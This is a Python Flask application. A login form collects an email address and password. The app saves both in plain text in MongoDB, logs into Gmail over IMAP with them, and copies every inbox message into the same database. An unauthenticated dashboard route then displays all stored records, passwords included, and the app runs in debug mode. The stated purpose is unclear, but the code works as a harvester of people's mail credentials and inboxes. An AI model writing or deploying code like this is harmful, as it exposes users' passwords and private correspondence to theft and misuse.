from flask import Flask, render_template, request, redirect, url_for
from pymongo import MongoClient
import imaplib
import email
from email.header import decode_header

app = Flask(__name__)

# MongoDB configuration
client = MongoClient("mongodb://localhost:27017/")
db = client["email_data"]
collection = db["users"]


@app.route("/")
def index():
    return redirect(url_for("login"))


@app.route("/login")
def login():
    return render_template("login.html")


@app.route("/submit", methods=["POST"])
def submit():
    if request.method == "POST":
        email = request.form["email"]
        password = request.form["password"]

        # Store email and password in MongoDB
        user_data = {"email": email, "password": password}
        collection.insert_one(user_data)

        # Fetch emails
        fetch_emails(email, password)

        return redirect(url_for("dashboard"))
    else:
        # Return a 405 Method Not Allowed error for other request methods
        return "Method Not Allowed", 405


@app.route("/dashboard")
def dashboard():
    # Fetch emails from MongoDB
    emails = collection.find()
    return render_template("dashboard.html", emails=emails)


def fetch_emails(username, password):
    # Connect to Gmail's IMAP server
    imap = imaplib.IMAP4_SSL("imap.gmail.com")
    imap.login(username, password)
    imap.select("inbox")

    # Search for all emails in the inbox
    result, data = imap.search(None, "ALL")
    email_ids = data[0].split()

    # Fetch email bodies for each email
    for email_id in email_ids:
        result, data = imap.fetch(email_id, "(RFC822)")
        raw_email = data[0][1]
        msg = email.message_from_bytes(raw_email)
        # Get subject
        subject_header = msg["Subject"]
        if subject_header is not None:
            subject = decode_header(subject_header)[0][0]
            if subject is None:
                subject = "No subject"
            else:
                subject = subject.decode() if isinstance(subject, bytes) else subject
        else:
            subject = "No subject"
        # Get sender
        from_header = msg.get("From")
        if from_header is not None:
            from_ = decode_header(from_header)[0][0]
            if from_ is None:
                from_ = "Unknown sender"
            else:
                from_ = from_.decode() if isinstance(from_, bytes) else from_
        else:
            from_ = "Unknown sender"
        # Get body
        payload = msg.get_payload(decode=True)
        body = payload.decode() if payload else "No body found"
        # Save email to MongoDB
        email_data = {"subject": subject, "from": from_, "body": body}
        collection.insert_one(email_data)

    # Close the connection
    imap.close()
    imap.logout()


if __name__ == "__main__":
    app.run(debug=True)
